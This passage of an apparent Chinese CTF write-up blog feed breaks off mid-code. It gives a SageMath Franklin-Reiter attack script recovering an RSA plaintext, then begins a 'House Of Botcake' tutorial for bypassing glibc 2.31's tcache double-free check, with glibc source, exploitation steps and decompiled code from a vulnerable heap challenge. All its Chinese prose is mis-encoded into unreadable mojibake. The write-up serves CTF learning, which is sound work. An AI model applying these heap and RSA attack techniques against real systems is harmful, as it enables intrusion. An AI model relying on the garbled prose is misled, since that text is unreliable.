class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 96294984374753089080583610747240203389088051930341615602841335596072081913930052484580770899610689065293206976889303327507604080242460321817406117877072425663471808350427893332726383611142246218026112051129578226014713958882307096859175042839198895428723757405196020266267824586199807170149650434306779718677   </span></span><br><span class="line"><span class="string">hint1 = 111128465335502483574544230236618721723785067258103368528600651970108082026274</span></span><br><span class="line"><span class="string">hint2 = 149777690555091648253749138438840244052377948686936166203166372618778229891842</span></span><br><span class="line"><span class="string">c1 = 19258639302759286032385037035129183959148363633353536085988651266927081471573889078520697158985164250184287591219408939982288951952002632371950165308028756191357634396067109728491154241759098403135297660541258808223827178690693818047525955978891748361038516201626720292976210372367169577574791733786601438737  </span></span><br><span class="line"><span class="string">c2 = 94728391095098686718854324913205273277837107275197779266203956111447917954217642996612375426900185362566372715775684730383657923112702380810451305560067414494793397392647318953106387697001580454130672044011060132072400728672015125332880303053556556640562753160804196189095016248121783366388642672259225712092  </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div><ul><li>æ³¨æ„ç»™å‡ºäº†hint1,hint2,äºŒå…ƒäºŒæ¬¡æ–¹ç¨‹ç»„ï¼Œå¯ä»¥ç”¨z3è§£å‡ºa,b</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">hint1 = ...</span><br><span class="line">hint2 = ...</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">a,b = Ints(<span class="string">&#x27;a b&#x27;</span>)</span><br><span class="line">s.add(a**<span class="number">2</span> + a*b == hint1)</span><br><span class="line">s.add(b**<span class="number">2</span> + a*b == hint2)</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(m[a], m[b])</span><br><span class="line"><span class="comment"># a= 217562055747111316427029035559575901669 </span></span><br><span class="line"><span class="comment"># b= 293227681709108659093110186239101833877</span></span><br></pre></td></tr></table></figure></div><ul><li>ç„¶åç›´æ¥å¥—æ¿å­å³å¯ï¼Œä½†æ˜¯å¯¹äºsageæ¥è¯´libnumæ˜¯å¤–éƒ¨åº“ï¼Œè¦åˆ°sageShellä¸‹è½½ï¼Œä½†æ˜¯ç›´æ¥ç”¨</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sage -python -m pip install libnum-i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure></div><p>ä¼šæŠ¥é”™ï¼Œè¦åŠ ä¸Š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--trusted-host pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure></div><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">96294984374753089080583610747240203389088051930341615602841335596072081913930052484580770899610689065293206976889303327507604080242460321817406117877072425663471808350427893332726383611142246218026112051129578226014713958882307096859175042839198895428723757405196020266267824586199807170149650434306779718677</span>   </span><br><span class="line">hint1 = <span class="number">111128465335502483574544230236618721723785067258103368528600651970108082026274</span></span><br><span class="line">hint2 = <span class="number">149777690555091648253749138438840244052377948686936166203166372618778229891842</span></span><br><span class="line">c1 = <span class="number">19258639302759286032385037035129183959148363633353536085988651266927081471573889078520697158985164250184287591219408939982288951952002632371950165308028756191357634396067109728491154241759098403135297660541258808223827178690693818047525955978891748361038516201626720292976210372367169577574791733786601438737</span>  </span><br><span class="line">c2 = <span class="number">94728391095098686718854324913205273277837107275197779266203956111447917954217642996612375426900185362566372715775684730383657923112702380810451305560067414494793397392647318953106387697001580454130672044011060132072400728672015125332880303053556556640562753160804196189095016248121783366388642672259225712092</span> </span><br><span class="line">e=<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">franklinReiter</span>(<span class="params">n,e,c1,c2,a,b</span>):</span><br><span class="line">    R.&lt;X&gt; = Zmod(n)[]</span><br><span class="line">    f1 = X^e - c1</span><br><span class="line">    f2 = (X*a+ b)^e - c2</span><br><span class="line">    <span class="comment"># coefficient 0 = -m, which is what we wanted!</span></span><br><span class="line">    <span class="keyword">return</span> Integer(n-(compositeModulusGCD(f1,f2)).coefficients()[<span class="number">0</span>]) <span class="comment"># ç³»æ•°</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># GCD is not implemented for rings over composite modulus in Sage</span></span><br><span class="line">  <span class="comment"># so we do our own implementation. Its the exact same as standard GCD, but with</span></span><br><span class="line">  <span class="comment"># the polynomials monic representation</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compositeModulusGCD</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span>(b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a.monic()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> compositeModulusGCD(b, a % b)</span><br><span class="line"></span><br><span class="line">total = <span class="number">0x18046866aad5439317601b1de20ad687a</span></span><br><span class="line"></span><br><span class="line">a=<span class="number">217562055747111316427029035559575901669</span> </span><br><span class="line">b=<span class="number">293227681709108659093110186239101833877</span></span><br><span class="line">m=franklinReiter(n,e,c1,c2,a,b)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;ZcxKh0OHA4nmSOnyeKsfh44P8FukJ6VMmQlXsAAAAASUVORK5CYII=&#x27;</span></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House Of Botcake</title>
      <link href="/2024/10/17/House-Of-Botcake/"/>
      <url>/2024/10/17/House-Of-Botcake/</url>
      
        <content type="html"><![CDATA[<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><p><a class="link" href="https://xz.aliyun.com/t/12653?time__1311=GqGxuDRCG=d052x+xCq4mwn0DcjfT4D">å‚è€ƒæ–‡ç«  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><code>House Of Botcache</code>æ˜¯ç”¨äºç»•è¿‡<code>tcache double free</code>æ£€æŸ¥çš„ä¸€ç§æ–¹æ³•ï¼Œåœ¨glibc2.29-2.31ï¼Œå¯¹äºtcacheåŠ å…¥äº†<code>key</code>å€¼æ¥æ£€æµ‹è¯¥tcacheæ˜¯å¦å·²ç»å­˜åœ¨äºtcache binsä¸­ï¼Œè¯¥æ–¹æ³•å°±æ˜¯å€Ÿç”¨<code>unsorted bin</code>æ¥ç»•è¿‡double freeçš„æ£€æŸ¥,ä¸‹é¢è·Ÿç€æºç æ¥åˆ†æä¸€ä¸‹ã€‚</p><h1 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h1><p><a class="link" href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L2924">æºç æ–‡æ¡£ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><mark><code>tcache</code>keyå€¼çš„å¼•è¿›<mark></mark></mark></p><ul><li>2984è¡Œ</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span> <span class="comment">// å¼•å…¥keyå€¼</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure></div><p><code>tcache double free</code>çš„æ£€æŸ¥</p><ul><li>2917è¡Œ</li><li><code>tcache_put</code></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache; <span class="comment">// è®¾ç½®è¯¥tcache</span></span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]); <span class="comment">// è®¡æ•°+1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>4181è¡Œ</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* å¦‚æœè¯¥chunkéç©ºï¼Œtcache binsæ²¡å¡«å……æ»¡ï¼Œé‚£ä¹ˆè¯¥chunkå¯èƒ½å·²ç»åœ¨tcache binsä¸­äº†ï¼Œæ‰€ä»¥è¦å¯¹å…¶è¿›è¡Œdouble freeçš„æ£€æŸ¥ï¼Œå³æ£€æŸ¥keyå€¼ */</span></span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">   coincidence before aborting.  */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    å¦‚æœæ˜¯double freeï¼Œé‚£ä¹ˆputæ—¶keyå­—æ®µè¢«è®¾ç½®äº†tcacheï¼Œå°±ä¼šè¿›å…¥å¾ªç¯è¢«æ£€æŸ¥å‡ºæ¥</span></span><br><span class="line"><span class="comment">    å¦‚æœä¸æ˜¯ï¼Œé‚£ä¹ˆkeyå­—æ®µå°±æ˜¯ç”¨æˆ·æ•°æ®åŒºåŸŸï¼Œå¯ä»¥è§†ä¸ºéšæœºçš„ï¼Œåªæœ‰1/(2^size_t)çš„å¯èƒ½è¡Œè¿›å…¥å¾ªç¯ï¼Œç„¶åå¾ªç¯å‘ç°å¹¶ä¸æ˜¯double free</span></span><br><span class="line"><span class="comment">  */</span> </span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"> tmp;</span><br><span class="line"> tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">// é€šè¿‡æ£€æŸ¥ï¼Œæ”¾å…¥tcache bins</span></span><br><span class="line">  &#123;</span><br><span class="line">    tcache_put (p, tc_idx); <span class="comment">// è¿›å…¥tcache binså°±ä¼šè¢«è®¾ç½®key</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div><blockquote><p><code>__glibc_unlikely</code> å®æ˜¯ç”¨æ¥å‘Šè¯‰ç¼–è¯‘å™¨ç‰¹å®šçš„æ¡ä»¶æˆ–åˆ†æ”¯â€œä¸å¤ªå¯èƒ½ä¸ºçœŸâ€ï¼Œä»è€Œä¼˜åŒ–ç”Ÿæˆçš„æœºå™¨ä»£ç </p></blockquote><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å½“free chunk è¿›å…¥åˆ°tcache binsä¸­çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¼šè®¾ç½®ä¸€ä¸ªkeyå€¼ç»™è¯¥chunkï¼Œä½¿å¾—double free æ£€æŸ¥çš„æ—¶å€™æ£€æŸ¥<code>è¯¥keyå€¼æ˜¯å¦å­˜åœ¨</code>ï¼Œå¦‚æœå­˜åœ¨ï¼Œå°±æ˜¯å­˜åœ¨double free</p><p><mark>æ³¨æ„<mark>:keyå€¼å­˜åœ¨çš„ä½ç½®æ˜¯chunkçš„æ•°æ®åŒºï¼Œæœ‰æå°å¯èƒ½å‡ºç°æ£€æŸ¥é”™è¯¯</mark></mark></p><h1 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h1><p>æ—¢ç„¶free chunkè¢«æ”¾è¿›tcacheå°±ä¼šè®¾ç½®keyå€¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å…ˆå°†tcache binå¡«æ»¡ï¼Œç„¶åå°†ä¸€ä¸ªfree chunkæ”¾åˆ°unsorted binä¸­ï¼Œæ¥ç€freeä¸€ä¸ªä¸unsorted bin chunkç›¸é‚»çš„chunkï¼Œä½¿å…¶åˆå¹¶ï¼Œç„¶åmallocä¸€ä¸ªtcache binä¸­çš„chunkï¼Œæ­¤æ—¶tcache binä¸­å°±ä¼šç•™ä¸‹ä¸€ä¸ªå‰©ä½™ï¼Œå†æ¬¡free unsorted bin ä¸­chunkå³å¯ã€‚</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>å¡«æ»¡tcache bin ï¼Œchunk1<span class="number">-7</span></span><br><span class="line"><span class="number">2.f</span>ree(chunk9) <span class="built_in">malloc</span>(chunk10)-&gt;å¯¹åº”äºchunk7,tcacheä¸­åªæœ‰<span class="number">6</span>ä¸ªchunkäº†</span><br><span class="line"><span class="number">3.f</span>ree(chunk8) -&gt; ä¸chunk9åˆå¹¶</span><br><span class="line"><span class="number">4.f</span>ree(chunk9) -&gt; è¿›å…¥åˆ°tcache bin è¾¾åˆ°<span class="type">double</span> <span class="built_in">free</span></span><br></pre></td></tr></table></figure></div><h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><p><mark><a class="link" href="http://27.25.151.80:8000/games/2/challenges">build ctf eznote <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><mark></mark></mark></p><p><code>glibc 2.31</code></p><h2 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h2><ul><li>åŸºæœ¬çš„å †èœå•ï¼Œæ‰€æœ‰åŠŸèƒ½éƒ½å¯ä»¥ç”¨</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( atoi(buf) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        dele();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Goodbye\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid Choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li><mark>add<mark></mark></mark></li></ul><p>åªèƒ½ç”³è¯·15ä¸ªchunkï¼Œå¹¶ä¸”é•¿åº¦æœ‰é™åˆ¶</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">size_t</span> size[<span class="number">2</span>]; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  size[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">14</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !note[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;The size of this note : &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, size);</span><br><span class="line">      <span class="keyword">if</span> ( size[<span class="number">0</span>] &amp;&amp; size[<span class="number">0</span>] &lt;= <span class="number">0x80</span> )<span class="comment">// é•¿åº¦é™åˆ¶</span></span><br><span class="line">      &#123;</span><br><span class="line">        note[i] = <span class="built_in">malloc</span>(size[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> ( !note[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The content of this note : &quot;</span>);</span><br><span class="line">        read_input(note[i], size[<span class="number">0</span>]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Too large! please try again&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li><mark>edit<mark></mark></mark></li></ul><p>æ¼æ´ç‚¹ä¹‹ä¸€ï¼šä»»æ„åœ°å€å†™ï¼Œä¿®æ”¹chunkä¸é™åˆ¶é•¿åº¦</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The index of this note : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( note[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The size of this content : &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">    v2 = atoi(buf); <span class="comment">// æ²¡æœ‰æ£€æŸ¥é•¿åº¦</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The content of this note : &quot;</span>);</span><br><span class="line">    read_input(note[v1], v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No this note, please try again!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li><mark>show<mark></mark></mark></li></ul><p>%sè¾“å‡ºï¼Œå¯ä»¥æ³„éœ²libc</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 